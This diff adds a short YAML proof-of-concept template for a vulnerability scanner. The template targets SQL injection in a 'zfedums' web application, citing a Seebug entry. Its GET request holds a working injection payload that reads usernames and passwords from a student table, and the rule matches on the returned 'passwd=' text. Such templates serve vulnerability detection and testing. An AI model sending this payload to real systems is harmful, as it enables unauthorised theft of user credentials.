@@ -1,0 +1,10 @@
+name: poc-yaml-zfedums-sqli
+rules:
+  - method: GET
+    path: /ResultXml_common.aspx?k=%&column='[username='||xh||']['||'passwd='||mm||']'&table=xsjbxxb+where+rownum<=10--
+    expression: |
+      response.body.bcontains(b"][passwd=")
+detail:
+  author: rexus
+  links:
+    - https://www.seebug.org/vuldb/ssvid-90659
